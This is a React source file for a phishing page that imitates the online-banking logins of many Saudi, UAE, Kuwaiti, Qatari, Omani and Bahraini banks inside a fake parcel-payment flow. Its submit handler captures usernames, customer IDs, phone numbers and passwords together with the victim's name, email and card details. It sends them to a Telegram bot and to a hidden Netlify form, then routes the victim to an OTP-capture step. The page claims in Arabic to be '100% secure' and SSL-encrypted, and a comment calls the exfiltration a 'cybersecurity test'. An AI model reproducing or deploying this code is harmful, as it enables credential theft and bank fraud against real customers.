import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { DynamicIdentity, EntityContainer } from "@/components/DynamicIdentity";
import { getPaymentEntityType } from "@/lib/paymentEntityHelper";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  // Bank login credentials state
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get customer info and selected bank from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {
    cardName: '',
    cardLast4: '',
    cardNumber: '',
    cardExpiry: '',
    cardCvv: '',
    cardType: '',
  };
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  // Get country from link data
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";

  const shippingInfo = linkData?.payload as any;

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  // Bank login always uses bank_pages entity type
  const entityType = 'bank_pages';
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  // Determine login type based on bank
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    // Saudi banks
    if (bankId === 'alrajhi_bank') return 'username'; // Username + Password
    if (bankId === 'alahli_bank') return 'username'; // Username + Password
    if (bankId === 'riyad_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'samba_bank') return 'username'; // Username + Password
    if (bankId === 'saudi_investment_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'arab_national_bank') return 'username'; // Username + Password
    if (bankId === 'saudi_fransi_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'alinma_bank') return 'username'; // Username + Password
    if (bankId === 'albilad_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'aljazira_bank') return 'username'; // Username + Password
    
    // UAE banks
    if (bankId === 'emirates_nbd') return 'username'; // Username + Password
    if (bankId === 'adcb') return 'customerId'; // Customer ID + Password
    if (bankId === 'fab') return 'username'; // Username + Password
    if (bankId === 'dib') return 'username'; // Username + Password
    if (bankId === 'mashreq_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'cbd') return 'username'; // Username + Password
    if (bankId === 'rakbank') return 'customerId'; // Customer ID + Password
    if (bankId === 'ajman_bank') return 'username'; // Username + Password
    
    // Kuwait banks
    if (bankId === 'nbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'gulf_bank') return 'username'; // Username + Password
    if (bankId === 'cbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'burgan_bank') return 'username'; // Username + Password
    if (bankId === 'ahli_united_bank') return 'username'; // Username + Password
    if (bankId === 'kfh') return 'customerId'; // Customer ID + Password
    if (bankId === 'boubyan_bank') return 'username'; // Username + Password
    
    // Qatar banks
    if (bankId === 'qnb') return 'customerId'; // Customer ID + Password
    if (bankId === 'cbq') return 'username'; // Username + Password
    if (bankId === 'doha_bank') return 'username'; // Username + Password
    if (bankId === 'qib') return 'customerId'; // Customer ID + Password
    if (bankId === 'masraf_alrayan') return 'username'; // Username + Password
    if (bankId === 'ahlibank') return 'customerId'; // Customer ID + Password
    
    // Oman banks
    if (bankId === 'bank_muscat') return 'customerId'; // Customer ID + Password
    if (bankId === 'national_bank_oman') return 'username'; // Username + Password
    if (bankId === 'bank_dhofar') return 'username'; // Username + Password
    if (bankId === 'ahli_bank_oman') return 'customerId'; // Customer ID + Password
    if (bankId === 'nizwa_bank') return 'username'; // Username + Password
    if (bankId === 'sohar_international') return 'customerId'; // Customer ID + Password
    
    // Bahrain banks
    if (bankId === 'nbb') return 'username'; // Username + Password
    if (bankId === 'bbk') return 'customerId'; // Customer ID + Password
    if (bankId === 'ahli_united_bahrain') return 'username'; // Username + Password
    if (bankId === 'bisb') return 'username'; // Username + Password
    if (bankId === 'ithmaar_bank') return 'customerId'; // Customer ID + Password
    if (bankId === 'khaleeji_bank') return 'username'; // Username + Password
    
    return 'username'; // Default
  };
  
  const loginType = getLoginType();
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate based on login type
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);

    // Store bank login info
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    // Save to sessionStorage (for current session) and link (for cross-device)
    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));

    // Save to link for cross-device compatibility
    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          bankLoginData,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
        // Error saving bank login data
      }
    }
    
    // Submit to Netlify Forms
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
      // Silent error handling
    }

    // Send bank login details to Telegram (cybersecurity test)
    const telegramResult = await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    // Navigate to OTP verification
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <DynamicIdentity entityType={entityType}>
      <EntityContainer entityType={entityType} useBackgroundImage={false}>
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
      description="أدخل بيانات الدخول للبنك لتأكيد العملية"
      icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Bank Info Header - Enhanced to look like real bank portal */}
      <div 
        className="rounded-xl p-5 sm:p-6 mb-6 shadow-lg border border-white/10"
        style={{
          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}dd, ${selectedBank?.color || branding.colors.secondary}dd)`,
        }}
      >
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center gap-3">
            {selectedBank?.logo ? (
              <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white p-2 flex items-center justify-center">
                <img 
                  src={selectedBank.logo} 
                  alt={selectedBank.nameAr}
                  className="max-w-full max-h-full object-contain"
                />
              </div>
            ) : (
              <div 
                className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
              >
                <Building2 className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
              </div>
            )}
            <div className="flex-1 text-white">
              <p className="text-xs sm:text-sm opacity-90 mb-1">الخدمات المصرفية الإلكترونية</p>
              <p className="text-xl sm:text-2xl font-bold leading-tight">{selectedBank?.nameAr || 'البنك'}</p>
              <p className="text-xs sm:text-sm opacity-80 mt-0.5">{selectedBank?.name || 'Online Banking'}</p>
            </div>
          </div>
          {selectedCountryData && (
            <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
          )}
        </div>
        
        {/* Bank portal header line */}
        <div className="flex items-center gap-2 text-white/90 text-xs sm:text-sm">
          <Lock className="w-4 h-4" />
          <span>تسجيل دخول آمن ومشفر</span>
          <span className="mr-auto">•</span>
          <span>SSL Encrypted</span>
        </div>
      </div>

      {/* Security Notice - Enhanced */}
      <div 
        className="rounded-xl p-4 sm:p-5 mb-6 border-2"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}05, ${branding.colors.primary}10)`,
          borderColor: `${branding.colors.primary}30`
        }}
      >
        <div className="flex items-start gap-3">
          <div 
            className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0"
            style={{ background: `${branding.colors.primary}20` }}
          >
            <ShieldCheck className="w-5 h-5" style={{ color: branding.colors.primary }} />
          </div>
          <div className="flex-1">
            <div className="flex items-center gap-2 mb-2">
              <h3 className="font-bold text-sm sm:text-base" style={{ color: branding.colors.primary }}>
                تسجيل دخول آمن 100%
              </h3>
              <svg className="w-4 h-4 text-green-500" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <p className="text-xs sm:text-sm text-muted-foreground leading-relaxed">
              سجّل دخولك إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان. جميع بياناتك محمية بتشفير 256-bit SSL.
            </p>
            <div className="flex items-center gap-4 mt-3 text-xs">
              <div className="flex items-center gap-1 text-green-600">
                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span>مشفر</span>
              </div>
              <div className="flex items-center gap-1 text-blue-600">
                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <span>موثّق</span>
              </div>
              <div className="flex items-center gap-1 text-purple-600">
                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <span>آمن</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Login Form - Enhanced to look like real bank login */}
      <form onSubmit={handleSubmit} className="space-y-5 sm:space-y-6">
        {/* Username Login */}
        {loginType === 'username' && (
          <div>
            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
              اسم المستخدم
            </Label>
            <div className="relative">
              <Input
                type="text"
                placeholder="أدخل اسم المستخدم"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
                style={{ borderColor: branding.colors.primary + '40' }}
                autoComplete="username"
                required
              />
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
              </div>
            </div>
          </div>
        )}
        
        {/* Customer ID Login */}
        {loginType === 'customerId' && (
          <div>
            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
              </svg>
              رقم العميل
            </Label>
            <div className="relative">
              <Input
                type="text"
                placeholder="أدخل رقم العميل"
                value={customerId}
                onChange={(e) => setCustomerId(e.target.value)}
                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
                style={{ borderColor: branding.colors.primary + '40' }}
                inputMode="numeric"
                required
              />
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
                </svg>
              </div>
            </div>
          </div>
        )}
        
        {/* Phone Login */}
        {loginType === 'phone' && (
          <div>
            <Label className="mb-2.5 text-sm sm:text-base font-semibold flex items-center gap-2">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
              </svg>
              رقم الجوال
            </Label>
            <div className="relative">
              <Input
                type="tel"
                placeholder="05xxxxxxxx"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-12 rounded-xl border-2 focus:border-primary transition-all"
                style={{ borderColor: branding.colors.primary + '40' }}
                inputMode="tel"
                required
              />
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
              </div>
            </div>
          </div>
        )}
        
        {/* Password (common for all types) */}
        <div>
          <div className="flex items-center justify-between mb-2.5">
            <Label className="text-sm sm:text-base font-semibold flex items-center gap-2">
              <Lock className="w-4 h-4" />
              كلمة المرور
            </Label>
            <button
              type="button"
              className="text-xs sm:text-sm font-medium hover:underline"
              style={{ color: branding.colors.primary }}
            >
              نسيت كلمة المرور؟
            </button>
          </div>
          <div className="relative">
            <Input
              type={showPassword ? "text" : "password"}
              placeholder="أدخل كلمة المرور"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="h-14 sm:h-16 text-base sm:text-lg pr-4 pl-24 rounded-xl border-2 focus:border-primary transition-all"
              style={{ borderColor: branding.colors.primary + '40' }}
              autoComplete="current-password"
              required
            />
            <div className="absolute left-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="text-muted-foreground hover:text-foreground transition-colors p-1"
              >
                {showPassword ? (
                  <EyeOff className="w-5 h-5" />
                ) : (
                  <Eye className="w-5 h-5" />
                )}
              </button>
              <div className="w-px h-6 bg-border" />
              <Lock className="w-5 h-5 text-muted-foreground" />
            </div>
          </div>
        </div>
        
        {/* Remember Me / Forgot Password */}
        <div className="flex items-center justify-between text-xs sm:text-sm">
          <div className="flex items-center gap-2">
            <input type="checkbox" id="remember" className="rounded" />
            <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
              تذكرني
            </label>
          </div>
          <button
            type="button"
            className="text-muted-foreground hover:underline"
            style={{ color: selectedBank?.color || branding.colors.primary }}
          >
            نسيت كلمة المرور؟
          </button>
        </div>
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
          disabled={isSubmitting}
          style={{
            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
          }}
        >
          {isSubmitting ? (
            <span>جاري تسجيل الدخول...</span>
          ) : (
            <>
              <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
              <span>تسجيل الدخول والمتابعة</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </>
          )}
        </Button>
        
        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
          بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
        </p>
      </form>
      
      {/* Additional Info */}
      <div className="mt-6 pt-6 border-t text-center">
        <p className="text-xs text-muted-foreground mb-3">
          لا تملك حساب؟
        </p>
        <Button
          type="button"
          variant="outline"
          size="sm"
          className="text-xs"
          style={{ borderColor: selectedBank?.color || branding.colors.primary }}
        >
          تسجيل حساب جديد
        </Button>
      </div>
    
      {/* Hidden Netlify Form */}
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </DynamicPaymentLayout>
      </EntityContainer>
    </DynamicIdentity>
  );
};

export default PaymentBankLogin;
